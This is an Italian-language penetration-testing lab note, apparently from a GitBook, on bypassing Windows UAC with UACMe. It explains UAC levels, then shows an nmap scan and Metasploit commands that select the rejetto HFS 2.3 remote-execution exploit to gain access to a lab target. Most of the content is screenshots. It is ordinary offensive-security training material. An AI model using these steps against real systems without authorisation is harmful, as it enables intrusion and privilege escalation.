# Bypassing UAC with UACMe

<figure><img src="../../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (425).png" alt=""><figcaption></figcaption></figure>

UACMe è una lista di metodi per bypassare l'UAC, attraverso un eseguibile da mettere sul target che può eseguire un payload.

## Come funziona UAC su un sistema Windows

<figure><img src="../../.gitbook/assets/image (427).png" alt=""><figcaption></figcaption></figure>

Su questa macchina c'è un account IEUser che fa parte del gruppo administrators

Infatti se lancio un programma come amministratore (es. cmd) mi esce la finestra UAC:

<figure><img src="../../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

Con un account non nel gruppo administrators sarebbe apparso l'UAC prompt con username e password da inserire di un amministratore.

### Livelli UAC

<figure><img src="../../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

In una installazione standard l'UAC non è mai settato al valore massimo.

Al livello massimo è difficile da bypassare:

<figure><img src="../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

## Bypass UAC via standard command shell (cmd) oppure meterpeter session

<figure><img src="../../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>

```
nmap 10.2.22.220
```

<figure><img src="../../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

Facendo una scansione del target con nmap vediamo che c'è un webserver sulla porta 80.

<figure><img src="../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

Il server è HFS sviluppato da rejetto nella versione 2.3, che è vulnerabile e quindi exploiteremo questa vulnerabilità con MSF per avere accesso alla macchina target.

### Exploit vulnerabilità webserver HFS 2.3 per avere accesso al target

```
service postgresql start && msfconsole
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
```

<figure><img src="../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

Viene impostato il payload di default per windows 32 bit, e ci va bene.

<figure><img src="../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

